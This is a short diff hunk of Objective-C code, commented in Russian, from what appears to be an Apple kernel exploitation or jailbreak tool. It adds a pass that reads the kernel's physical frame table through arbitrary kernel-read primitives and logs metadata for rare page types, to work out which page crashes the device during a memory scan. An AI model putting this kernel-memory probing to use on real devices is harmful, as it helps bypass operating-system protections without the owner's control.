@@ -6965,6 +6965,32 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t srcPA = spix ? vtophys(ttM, (uint64_t)spix) : 0;
             int nCand = 0, nScanned = 0, nLoose = 0, nCap = 0;
             static uint8_t ftChunk[0x10000];   // 4096 фреймов за проход
+            // 1.9.194: МЕТА-ЗАХВАТ перед боем — каждый кандидат окна с полными
+            // 16 байтами фрейм-записи (q0/q1), БЕЗ контент-чтений (метаданные
+            // безопасны — census). Если контент-скан умрёт, первый кандидат
+            // мета-захвата выше последней строки скана = убийца, и его q0/q1
+            // у нас в руках → дискриминирующий бит против безопасных страниц.
+            if (ftVA) {
+                int nMeta = 0;
+                for (uint64_t fb = 0; fb < totalPages; fb += 4096) {
+                    uint64_t nent = totalPages - fb; if (nent > 4096) nent = 4096;
+                    kreadbuf(ftVA + fb * 16, ftChunk, (size_t)(nent * 16));
+                    for (uint64_t e = 0; e < nent; e++) {
+                        uint8_t t = ftChunk[e * 16 + 2];
+                        BOOL rare = (t == 0x8 || t == 0x9 || t == 0x13 || t == 0x17 || t == 0xc || t == 0x6);
+                        if (!rare) continue;
+                        uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
+                        if (pa < 0x10008000000ULL || pa >= 0x10010000000ULL) continue;
+                        uint64_t q0 = 0, q1 = 0;
+                        memcpy(&q0, ftChunk + e * 16, 8);
+                        memcpy(&q1, ftChunk + e * 16 + 8, 8);
+                        kpNote(r, [NSString stringWithFormat:@"  [P3M] %#llx t=%#x q0=%#018llx q1=%#018llx",
+                                  (unsigned long long)pa, t, (unsigned long long)q0, (unsigned long long)q1]);
+                        nMeta++;
+                    }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [P3M] мета-захват: %d кандидатов окна — начинаю контент-скан", nMeta]);
+            }
             // 1.9.193: тройной заход против убийцы у КРАЯ табличного региона
             // (тихий ресет 00:37 — смерть на фрейме сразу за полосой 0x9):
             //  pass 0: редкие типы, ТОЛЬКО окно таблиц [0x10008000000..0x10010000000]
